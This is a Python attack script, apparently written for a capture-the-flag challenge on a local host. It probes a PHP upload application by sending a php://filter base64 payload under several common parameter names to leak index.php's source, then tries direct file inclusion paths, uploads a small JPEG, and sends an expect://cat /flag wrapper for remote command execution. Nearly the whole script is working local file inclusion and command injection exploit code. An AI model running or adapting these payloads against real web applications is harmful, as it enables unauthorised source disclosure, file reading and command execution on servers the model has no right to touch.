import requests
import base64
import re

base_url = "http://127.0.0.1:32824"

print("Analyzing application response patterns...")
print("=" * 60)

# First, let's see what the actual index.php source looks like
print("\n1. Attempting to read index.php source via php://filter...")

# Try php://filter to read the source code
payload = "php://filter/convert.base64-encode/resource=index.php"
param_list = ['file', 'include', 'page', 'img', 'view', 'path', 'inc']

for param in param_list:
    url = f"{base_url}/index.php?{param}={payload}"
    resp = requests.get(url, timeout=5)
    
    print(f"\nTesting {param}=php://filter...")
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.content)}")
    
    # Look for base64 encoded content
    content = resp.text
    # Extract base64 if it's there
    if len(content) > 1000:
        # Try to find base64 pattern
        b64_match = re.search(r'([A-Za-z0-9+/]{100,}={0,2})', content)
        if b64_match:
            try:
                decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                print(f"[SUCCESS] Decoded source via {param}:")
                print("=" * 60)
                print(decoded[:2000])
                print("=" * 60)
                break
            except:
                pass
    else:
        print(f"Content: {content[:500]}")

# If php://filter doesn't work, try direct file reading
print("\n2. Testing direct file reading...")
test_files = ['index.php', '/var/www/html/index.php', './index.php']

for param in param_list:
    for test_file in test_files:
        url = f"{base_url}/index.php?{param}={test_file}"
        resp = requests.get(url, timeout=5)
        
        if resp.status_code == 200 and len(resp.content) > 500:
            print(f"\n[FOUND] File content via {param}={test_file}")
            print(f"Length: {len(resp.content)}")
            print(f"Content type headers: {dict(resp.headers)}")
            print(f"Content preview: {resp.text[:1000]}")

# Check what parameter actually controls the image display
print("\n3. Testing parameters with legitimate image...")
# First upload a test image
from io import BytesIO
test_jpg = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xe1\x00\x18Exif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x00\x00\x00\xff\xd9'

files = {'userfile': ('test.jpg', BytesIO(test_jpg), 'image/jpeg')}
data = {'submit': 'Upload Image'}
resp = requests.post(f"{base_url}/index.php", files=files, data=data)
print(f"Upload status: {resp.status_code}")

# Now test which parameter displays it
if 'upload/' in resp.text:
    # Extract the upload path from response
    upload_match = re.search(r'href=[\'"](upload/[^\'"]+)[\'"]', resp.text)
    if upload_match:
        uploaded_file = upload_match.group(1)
        print(f"Uploaded file: {uploaded_file}")
        
        # Test each parameter
        for param in param_list:
            url = f"{base_url}/index.php?{param}={uploaded_file}"
            resp_test = requests.get(url)
            print(f"\n{param} parameter test:")
            print(f"  URL: {url}")
            print(f"  Status: {resp_test.status_code}")
            print(f"  Length: {len(resp_test.content)}")
            
            # Check if this parameter actually controls the display
            if f'src="{uploaded_file}"' in resp_test.text or 'JFIF' in resp_test.text:
                print(f"  [DISPLAY PARAMETER FOUND] '{param}' controls image display")
                
                # Now test with expect wrapper on this parameter
                print(f"\n  Testing expect:// wrapper on {param}...")
                cmd = "cat%20/flag"
                test_url = f"{base_url}/index.php?{param}=expect://{cmd}"
                cmd_resp = requests.get(test_url, timeout=10)
                print(f"  Command test URL: {test_url}")
                print(f"  Status: {cmd_resp.status_code}")
                print(f"  Length: {len(cmd_resp.content)}")
                if len(cmd_resp.content) < 2000:
                    print(f"  Response: {repr(cmd_resp.text[:1000])}")
                    if 'FLAG{' in cmd_resp.text:
                        print(f"  [!] FLAG FOUND!")

print("\n" + "=" * 60)
print("Analysis complete.")
